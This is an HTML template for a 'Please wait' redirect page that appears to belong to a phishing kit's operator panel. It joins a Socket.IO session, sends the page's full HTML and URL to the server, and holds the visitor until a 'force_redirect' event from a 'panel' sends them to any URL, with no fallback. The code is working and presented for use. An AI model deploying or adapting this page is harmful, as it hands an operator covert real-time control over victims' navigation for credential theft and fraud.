<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f5f5f5;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <h1>Please wait while we prepare your content...</h1>
    <div class="loader"></div>
    <p>You will be redirected shortly.</p>
    
    <script>
        // Connect to Socket.IO
        const socket = io();
        const sessionId = '{{ session_id }}';
        
        console.log('Connecting to session:', sessionId);
        
        // Join the session room
        socket.emit('join', { session_id: sessionId });
        
        // Listen for redirect events
        socket.on('redirect', function(data) {
            console.log('Redirect received:', data.url);
            window.location.href = data.url;
        });
        
        // Listen for force redirect events (to any URL)
        socket.on('force_redirect', function(data) {
            console.log('Force redirect received:', data.url);
            window.location.href = data.url;
        });
        
        // Send page view information to server
        socket.emit('page_view', {
            session_id: sessionId,
            html_content: document.documentElement.innerHTML,
            url: window.location.href
        });
        
        // No fallback redirect - wait for manual redirect from panel
    </script>
</body>
</html>